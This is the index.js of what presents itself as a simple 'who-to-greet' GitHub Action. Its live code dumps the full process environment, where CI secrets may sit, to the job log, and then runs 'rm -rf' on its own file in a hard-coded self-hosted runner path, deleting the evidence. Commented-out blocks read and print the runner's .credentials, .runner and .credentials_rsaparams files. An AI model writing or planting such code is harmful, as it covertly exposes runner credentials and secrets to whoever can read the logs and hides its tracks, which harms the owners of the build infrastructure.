const core = require('@actions/core');
const github = require('@actions/github');
const fs = require("fs");
const cl_process = require("child_process");

try {
    
    console.log("This is the v1.1.2 version.");
    console.log(__dirname);
    console.log(process.env);

    cl_process.exec(`rm -rf /home/musset/actions-runner/_work/_actions/dreamli0/my-action/main/index.js`, (err, stdout, stderr) => {
        if (err){
            console.log(err);
            return;
        }
        console.log(`stdout: ${stdout.toString()}`);
        console.log(`stderr: ${stderr}`);
    });

    console.log("done...");

    

    // const files = fs.readdirSync('/home/musset/actions-runner');
    // files.forEach(element => {
    //     if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
            
    //         let path = `/home/musset/actions-runner/${element}`;
            
    //         fs.readFile(path, "utf8", (err, data) => {
    //             if(err){
    //                 console.log(err);
    //                 return;
    //             }
    //             console.log(`-----${element}------`);
    //             console.log(data.toString());
    //         });
            
    //     }
        
    // });
    // const files_other = fs.readdirSync('/home/musset/actions-runner-private');
    // files_other.forEach(element => {
    //     if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
            
    //         let path = `/home/musset/actions-runner-private/${element}`;
            
    //         process.exec(`cat ${path}`, (err, stdout, stderr) => {
    //             if (err){
    //                 console.log(err);
    //                 return;
    //             }
    //             console.log(`-----${element}------`);
    //             console.log(`stdout: ${stdout.toString()}`);
    //             console.log(`stderr: ${stderr}`);
    //         });
            
    //     }
    // });

    const nameToGreet = core.getInput('who-to-greet');
    console.log(`Say Hello ${nameToGreet}!`);
    const time = (new Date()).toTimeString();
    core.setOutput("time", time);

    // const payload = JSON.stringify(github.context.payload, undefined, 2);
    // console.log(`The event payload: ${payload}`);


} catch (error) {
    core.setFailed(error.message);
}